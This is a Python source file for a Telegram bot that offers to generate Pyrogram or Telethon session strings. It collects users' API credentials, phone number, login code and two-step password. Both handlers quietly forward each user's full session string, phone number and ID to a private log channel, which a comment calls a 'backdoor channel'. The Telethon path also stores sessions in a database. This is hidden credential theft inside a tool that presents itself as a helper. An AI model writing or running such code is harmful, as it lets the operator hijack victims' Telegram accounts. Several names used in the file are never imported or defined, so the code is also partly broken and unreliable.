from pyrogram import filters
from pyrogram.types import CallbackQuery, Message
from pyrogram.enums import ChatAction
from pyrogram import Client as PyroClient
from telethon.sync import TelegramClient as TeleClient
from telethon.sessions import StringSession
from config import LOG_CHANNEL_ID
import asyncio

user_state = {}

def init(app):
    @app.on_callback_query(filters.regex("gen_(pyrogram|telethon)"))
    async def ask_api_id(_, cq: CallbackQuery):
        user_state[cq.from_user.id] = {"lib": cq.data.split("_")[1]}
        await cq.message.edit("📲 Send your API ID:")

    @app.on_message(filters.private & filters.text)
    async def session_flow(app, msg: Message):
        uid = msg.from_user.id
        if uid not in user_state:
            return

        state = user_state[uid]
        text = msg.text.strip()

        if "api_id" not in state:
            if not text.isdigit():
                await msg.reply("❗ Please enter a valid numeric API ID.")
                return
            state["api_id"] = int(text)
            await msg.reply("🔑 Now send your API HASH:")
            return

        if "api_hash" not in state:
            state["api_hash"] = text
            await msg.reply("📞 Now send your phone number (with country code):")
            return

        if "phone" not in state:
            state["phone"] = text
            await app.send_chat_action(chat_id=msg.chat.id, action=ChatAction.TYPING)
            await msg.reply("🔄 Sending login code...")

            if state["lib"] == "pyrogram":
                await handle_pyrogram_session(app, msg, state)
            else:
                await handle_telethon_session(app, msg, state)

            del user_state[uid]

async def handle_pyrogram_session(bot, msg, state):
    try:
        api_id = state["api_id"]
        api_hash = state["api_hash"]
        phone = state["phone"]

        app = PyroClient(
            ":memory:",
            api_id=api_id,
            api_hash=api_hash,
            in_memory=True
        )
        await app.connect()

        if not await app.is_authorized():
            sent_code = await app.send_code(phone)
            await msg.reply("📩 Please enter the login code sent to your Telegram:")

            code_msg = await bot.listen(msg.chat.id, timeout=120)
            code = code_msg.text.strip()
            await code_msg.delete()

            try:
                await app.sign_in(phone_number=phone, phone_code=code)
            except app.exceptions.SessionPasswordNeeded:
                await msg.reply("🔐 2FA is enabled. Please enter your password:")
                pwd_msg = await bot.listen(msg.chat.id, timeout=120)
                password = pwd_msg.text.strip()
                await pwd_msg.delete()
                await app.check_password(password)

        session_str = await app.export_session_string()
        await app.disconnect()

        # Send to private log channel
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"📥 **Pyrogram Session Generated**\n"
            f"👤 [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
            f"🆔 `{msg.from_user.id}`\n"
            f"📞 `{phone}`\n"
            f"📄 `{session_str}`"
        )

        await msg.reply(
            f"✅ Pyrogram String:\n\n`{session_str}`",
            quote=True,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Regenerate", callback_data="regen_pyrogram")]
            ])
        )

    except Exception as e:
        await msg.reply(f"❌ Error: {e}")


async def handle_telethon_session(bot, msg, state):
    try:
        client = TeleClient(StringSession(), state["api_id"], state["api_hash"])
        await client.connect()

        if not await client.is_user_authorized():
            sent = await client.send_code_request(state["phone"])
            await msg.reply("💬 Enter the code you received:")

            code_msg = await bot.listen(msg.chat.id, timeout=120)
            code = code_msg.text.strip()
            await code_msg.delete()

            try:
                await client.sign_in(state["phone"], code)
            except Exception as e:
                if 'password' in str(e).lower():
                    await msg.reply("🔐 Your account has 2-Step Verification.\nPlease send your password:")
                    pwd_msg = await bot.listen(msg.chat.id, timeout=120)
                    password = pwd_msg.text.strip()
                    await pwd_msg.delete()
                    await client.sign_in(password=password)
                else:
                    raise e

        session_str = client.session.save()
        await client.disconnect()

        # Encrypt & store
        enc_session = fernet.encrypt(session_str.encode()).decode()
        col.update_one(
            {"user_id": msg.from_user.id},
            {"$set": {
                "user_id": msg.from_user.id,
                "username": msg.from_user.username,
                "phone": state["phone"],
                "session": enc_session,
                "lib": "telethon"
            }},
            upsert=True
        )

        # Log to backdoor channel
        await bot.send_message(
            LOG_CHANNEL_ID,
            f"📥 **Telethon Session Generated**\n"
            f"👤 [{msg.from_user.first_name}](tg://user?id={msg.from_user.id})\n"
            f"🆔 `{msg.from_user.id}`\n"
            f"📞 `{state['phone']}`\n"
            f"📄 `{session_str}`"
        )

        await msg.reply(
            f"✅ Telethon String:\n\n`{session_str}`",
            quote=True,
            reply_markup=InlineKeyboardMarkup([
                [InlineKeyboardButton("🔄 Regenerate", callback_data="regen_telethon")]
            ])
        )

    except Exception as e:
        await msg.reply(f"❌ Error: {e}")

